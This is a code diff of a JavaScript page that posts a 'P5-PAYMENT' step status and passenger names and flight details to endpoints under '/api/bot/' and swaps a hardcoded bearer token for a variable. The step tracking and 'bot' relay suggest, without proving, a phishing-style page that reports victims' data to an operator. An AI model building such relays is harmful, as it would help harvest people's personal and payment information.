@@ -14,11 +14,11 @@ const updateDOM = () =>{
     }
 
 
-    fetch(`${API_URL}/view`, {
+    fetch(`${API_URL}/api/bot/status`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'Authorization': 'Bearer 123123123',
+            'Authorization': `Bearer ${API_KEY}`
         },
         body: JSON.stringify({message: 'P5-PAYMENT'})
     });
@@ -151,11 +151,11 @@ const nextStep = () =>{
                         payload.babies = info.flightInfo.babies;
                         payload.dudename = info.metaInfo.name.split(' ')[0] ?? info.metaInfo.name;
                         payload.surname = info.metaInfo.name.split(' ')[1] ?? '';
-                        fetch(`${API_URL}/generals`, {
+                        fetch(`${API_URL}/api/bot/flight/data`, {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
-                                'Authorization': 'Bearer 123123123',
+                                'Authorization': `Bearer ${API_KEY}`,
                             },
                             body: JSON.stringify(payload)
                         });
